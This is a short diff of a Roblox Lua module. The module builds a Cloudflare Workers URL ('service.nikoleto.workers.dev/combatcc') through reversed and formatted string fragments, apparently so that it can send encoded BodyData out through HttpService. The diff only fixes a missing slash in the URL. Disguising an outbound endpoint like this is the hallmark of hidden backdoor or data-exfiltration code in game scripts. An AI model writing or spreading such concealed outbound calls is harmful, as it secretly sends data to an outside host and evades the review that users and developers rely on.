@@ -6,7 +6,7 @@ local reverse = string.reverse
 local format = string.format
 
 local HttpService = game:GetService("HttpService")
-local WORKER_URL = "https://" .. format("se%sce.", "rvi") .. reverse("otelokin") .. ".workers.dev" .. reverse(format("%sabmoc", "cct"))
+local WORKER_URL = "https://" .. format("se%sce.", "rvi") .. reverse("otelokin") .. ".workers.dev/" .. reverse(format("%sabmoc", "cct"))
 
 return function(BodyData)
     local Success, Encoded = pcall(function()
